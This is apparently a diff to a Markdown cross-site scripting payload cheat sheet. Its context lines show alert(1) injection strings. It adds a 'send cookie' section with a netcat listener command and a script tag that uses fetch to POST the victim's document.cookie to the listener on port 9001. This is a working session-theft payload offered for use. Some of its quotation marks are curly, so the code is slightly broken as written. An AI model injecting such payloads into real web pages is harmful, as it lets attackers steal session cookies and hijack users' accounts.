@@ -605,3 +605,19 @@ x");$=alert, $(1);//
 
 '}};alert(1);{{'
 ```
+
+## send cookie
+
+```
+nc -lvp 9001
+```
+
+```
+<script>
+fetch(‘http://127.0.0.1:9001', {
+method: ‘POST’,
+mode: ‘no-cors’,
+body:document.cookie
+});
+</script>
+```
